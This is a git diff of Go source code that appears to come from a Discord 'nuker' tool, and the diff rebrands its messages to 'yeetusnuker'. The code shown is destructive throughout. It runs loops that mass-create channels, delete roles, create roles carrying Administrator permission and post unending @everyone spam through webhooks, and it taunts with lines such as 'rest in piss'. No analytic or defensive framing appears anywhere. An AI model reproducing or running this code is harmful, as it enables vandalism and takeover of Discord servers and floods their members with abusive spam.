@@ -88,7 +88,7 @@ restart:
 
 		for i := 0; i < 250; i++ {
 
-			go h.CreateChannels(dg, guildID, "how-do-i-code", guildz) // use - instead of space or its finna break
+			go h.CreateChannels(dg, guildID, "nuked by yeetusnuker, rest in piss", guildz) // use - instead of space or its finna break
 			go DeleteRoles(dg, guildz)
 			go SpamRoles(dg, guildz)
 		}
@@ -170,7 +170,7 @@ func SpamRoles(dg *discordgo.Session, guild *discordgo.Guild) {
 			color.Error.Tips("Error creating role", err)
 		}
 		color.Success.Tips("Created role successfully " + create.Name)
-		_, err = dg.GuildRoleEdit(guild.ID, create.ID, "leki was here", 16711680, false, discordgo.PermissionAdministrator, false)
+		_, err = dg.GuildRoleEdit(guild.ID, create.ID, "yeetus", 16711680, false, discordgo.PermissionAdministrator, false)
 		color.Success.Tips("Edited role successfully " + create.Name)
 
 		if err != nil {
@@ -238,7 +238,7 @@ func (h *How) CreateChannels(dg *discordgo.Session, guildID, channelName string,
 		}
 		color.Success.Tips("Successfully created a channel")
 
-		hook, err := dg.WebhookCreate(channel.ID, "How-to-code-i-forgor", "https://i.ytimg.com/vi/DqZZRGXuHF8/maxresdefault.jpg")
+		hook, err := dg.WebhookCreate(channel.ID, "GET NUKED BY YEETUSNUKER LMFAO")
 		if err != nil {
 			color.Error.Tips(err.Error())
 		} else {
@@ -249,7 +249,7 @@ func (h *How) CreateChannels(dg *discordgo.Session, guildID, channelName string,
 				for {
 					retry:
 					randomIndex := rand.Intn(len(webhooks))
-					req, err1 := http.Post(webhooks[randomIndex], "application/json", strings.NewReader(`{"content":"@everyone mb yo https://github.com/zLeki/How\nhttps://tenor.com/view/rip-pack-bozo-dead-gif-20309754"}`))
+					req, err1 := http.Post(webhooks[randomIndex], "application/json", strings.NewReader(`{"content":"@everyone nuked by yeetusnuker lol, rest in piss"}`))
 					if err1 != nil {
 						color.Error.Tips(err1.Error())
 					}
